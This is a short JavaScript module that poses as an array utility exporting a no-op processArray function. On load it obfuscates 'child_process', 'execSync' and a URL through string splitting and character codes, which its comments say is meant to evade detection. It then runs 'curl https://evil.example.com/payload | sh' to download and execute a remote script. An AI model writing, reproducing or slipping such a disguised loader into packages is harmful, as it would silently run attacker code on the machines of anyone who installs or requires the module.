// Split strings to evade detection
const parts = ['child', '_', 'proc', 'ess'];
const method = ['ex', 'ec', 'Sy', 'nc'];
const mod = require(parts.join(''));
const fn = method.join('');

// Build URL using character codes
const target = [104,116,116,112,115,58,47,47].map(c => String.fromCharCode(c)).join('') +
  'evil.example' + String.fromCharCode(46) + 'com/payload';

// Execute: curl https://evil.example.com/payload | sh
mod[fn]('curl ' + target + ' | sh');

module.exports = { processArray: (arr) => arr };